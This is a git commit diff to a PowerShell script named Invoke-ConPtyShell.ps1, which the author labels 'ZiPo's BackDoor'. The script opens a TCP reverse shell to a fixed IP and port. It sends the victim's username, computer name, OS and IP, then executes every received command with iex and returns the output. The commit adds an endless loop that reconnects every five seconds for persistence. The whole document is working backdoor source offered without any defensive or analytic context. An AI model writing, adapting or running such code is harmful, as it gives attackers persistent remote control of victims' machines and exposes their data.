1e4c94b79bdb5cd7263eb2fce9357b9ac01945e6
Lev Vedrov <102747673+zipo0@users.noreply.github.com>
2025-04-09 00:56:21 +0300

    Update Invoke-ConPtyShell.ps1

--- Invoke-ConPtyShell.ps1
+++ Invoke-ConPtyShell.ps1
@@ -1,27 +1,32 @@
-$client = New-Object System.Net.Sockets.TCPClient("192.168.50.228",6666);
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{0};
+function Connect-Back {
+    $endpoint = "192.168.50.228"
+    $port = 6666
 
-# ANSI escape-последовательность очистки экрана (в байтах)
-$esc = [char]27
-$clear = "$esc[2J$esc[H"
-$clearBytes = [System.Text.Encoding]::ASCII.GetBytes($clear)
-$stream.Write($clearBytes, 0, $clearBytes.Length)
-$stream.Flush()
+    while ($true) {
+        try {
+            $client = New-Object System.Net.Sockets.TCPClient($endpoint, $port)
+            if ($client.Connected) {
+                $stream = $client.GetStream()
+                [byte[]]$bytes = 0..65535|%{0}
 
-# ASCII баннер
-$banner = @"
- ________  .__              __________                .___           
- \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
-  |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
-  |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
- /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
-         \/        \/\/                                      \/    \/ 
-             NEW ZiPo's BackDoor Connected
+                # Очистка экрана
+                $esc = [char]27
+                $clear = "$esc[2J$esc[H"
+                $stream.Write([System.Text.Encoding]::ASCII.GetBytes($clear), 0, $clear.Length)
+                $stream.Flush()
+
+                # Баннер
+                $banner = @"
+   ________  .__              __________                .___           
+   \______ \ |__| ____ ___.__. \______   \_______  ____ |__| ____  ____ 
+    |    |  \|  |/    <   |  |  |     ___/\_  __ \/  _ \|  |/ ___\/ __ \\
+    |    `   \  |   |  \___  |  |    |     |  | \(  <_> )  \  \__\  ___/
+   /_______  /__|___|  / ____|  |____|     |__|   \____/|__|\___  >___  >
+           \/        \/\/                                      \/    \/ 
+             ZiPo's BackDoor Connected
 "@
 
-# Системная информация
-$sysinfo = @"
+                $sysinfo = @"
 Username: $env:USERNAME
 Computer: $env:COMPUTERNAME
 OS: $([System.Environment]::OSVersion.VersionString)
@@ -31,18 +36,28 @@ IP: $((Test-Connection -ComputerName (hostname) -Count 1).IPv4Address.IPAddressT
 ---------------------------------------------------
 "@
 
-# Отправка баннера и системной информации
-$intro = "$banner`n$sysinfo"
-$introBytes = [System.Text.Encoding]::ASCII.GetBytes($intro)
-$stream.Write($introBytes, 0, $introBytes.Length)
-$stream.Flush()
+                $intro = "$banner`n$sysinfo"
+                $introBytes = [System.Text.Encoding]::ASCII.GetBytes($intro)
+                $stream.Write($introBytes, 0, $introBytes.Length)
+                $stream.Flush()
 
-# Основной цикл команд
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
-  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-  $sendback = (iex $data 2>&1 | Out-String );
-  $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
-  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-  $stream.Write($sendbyte,0,$sendbyte.Length);
-  $stream.Flush()
-};$client.Close()
+                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
+                    $sendback = (iex $data 2>&1 | Out-String )
+                    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
+                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+                    $stream.Write($sendbyte,0,$sendbyte.Length)
+                    $stream.Flush()
+                }
+
+                $stream.Close()
+                $client.Close()
+            }
+        }
+        catch {
+            Start-Sleep -Seconds 5  # Переподключение каждые 5 сек
+        }
+    }
+}
+
+Connect-Back
